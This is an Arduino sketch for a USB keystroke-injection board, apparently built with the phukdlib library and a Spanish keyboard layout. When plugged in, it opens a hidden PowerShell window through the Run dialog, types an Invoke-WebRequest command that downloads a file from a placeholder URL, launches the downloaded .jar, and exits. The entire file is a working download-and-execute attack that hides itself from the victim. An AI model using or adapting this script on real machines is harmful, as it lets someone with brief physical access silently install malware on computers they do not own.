#define kbd_es_es
#include <phukdlib_leonardo.h>

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("powershell -windowstyle hidden");
  delay(4000);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(200);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();
  delay(5000);
  Keyboard.println("$source = \"File URL \"; $destination = \"Path\\FileName\"; Invoke-WebRequest $source -OutFile $destination;");
  delay(2000);
  Keyboard.println("start-process FileName.jar");
  delay(2000);
  Keyboard.println("exit");
  while(1);
}
